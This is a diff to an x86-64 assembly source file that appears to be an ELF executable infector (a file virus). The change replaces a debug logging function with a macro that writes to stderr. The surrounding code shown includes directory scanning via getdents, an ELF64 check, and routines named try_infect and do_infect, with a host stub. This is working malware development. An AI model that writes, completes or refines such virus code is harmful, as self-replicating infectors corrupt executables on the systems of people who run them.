@@ -5,6 +5,28 @@ section .text
 %define TRUE    1
 %define FALSE   0
 
+%macro log 2
+%ifdef DEBUG
+    push rax
+    push rdi
+    push rsi
+    push rdx
+    push r11
+
+    mov rax, SYS_WRITE
+    mov rdi, STDERR_FILENO
+    mov rsi, %1
+    mov rdx, %2
+    syscall
+
+    pop r11
+    pop rdx
+    pop rsi
+    pop rdi
+    pop rax
+%endif
+%endmacro
+
 STUB_SIZE:      equ (_end - _start)
 DIRENT_ARR_SIZE:    equ 1024
 
@@ -21,6 +43,10 @@ SYS_MUNMAP:     equ 11
 SYS_EXIT:       equ 60
 SYS_GETDENTS:   equ 78
 SYS_CHMOD:      equ 90
+
+; file descriptors
+STDOUT_FILENO:  equ 1
+STDERR_FILENO:  equ 2
 
 ; open flags
 O_RDONLY:       equ 0
@@ -184,13 +210,9 @@ _start:
 
         mov data(dir_fd), rax
 
-        lea rdi, [rel directory_msg]
-        mov rsi, 4
-        call log
+        log directory_msg, 4
     .read_directory:
-        lea rdi, [rel read_directory_msg]
-        mov rsi, 15
-        call log
+        log read_directory_msg, 15
 
         mov rdx, DIRENT_ARR_SIZE
         lea rsi, data(dirent_array)
@@ -203,9 +225,7 @@ _start:
         xor r13, r13 ; offset counter for directory entries
         mov r12, rax ; number of bytes read by getdents
     .process_file:
-        lea rdi, [rel file_msg]
-        mov rsi, 5
-        call log
+        log file_msg, 5
 
         lea rdi, data(dirent_array)
         add rdi, r13
@@ -227,9 +247,7 @@ _start:
         jl .process_file
         jmp .read_directory
     .close_directory:
-        lea rdi, [rel close_msg]
-        mov rsi, 6
-        call log
+        log close_msg, 6
 
         mov rdi, data(dir_fd)
         mov rax, SYS_CLOSE
@@ -250,13 +268,7 @@ _start:
 
 ; void try_infect(rdi=char*, rsi=char*)
 try_infect:
-    push rsi
-    push rdi
-    lea rdi, [rel infect_msg]
-    mov rsi, 7
-    call log
-    pop rdi
-    pop rsi
+    log infect_msg, 7
 
     mov rax, rsi
     mov rsi, rdi
@@ -341,11 +353,7 @@ is_elf64:
         ret
 
 do_infect:
-    push rdi
-    lea rdi, [rel do_infect_msg]
-    mov rsi, 10
-    call log
-    pop rdi
+    log do_infect_msg, 10
 
     push r13
     push r14
@@ -446,21 +454,7 @@ try_open:
 
 ; size_t log(rdi=char*, rsi=len)
 ; Writes rsi bytes of rdi to stdout.
-log:
-%ifdef DEBUG
-    push rdx
-    push rsi
 
-    mov rax, SYS_WRITE
-    mov rdx, rsi
-    mov rsi, rdi
-    mov rdi, 1
-    syscall
-
-    pop rsi
-    pop rdx
-%endif
-    ret
 
 exit:
     mov rax, SYS_EXIT
@@ -511,9 +505,7 @@ _host:
     push rdi
     push rsi
     push rdx
-    lea rdi, [rel host_msg]
-    mov rsi, 5
-    call log
+    log host_msg, 5
     pop rdx
     pop rsi
     pop rdi
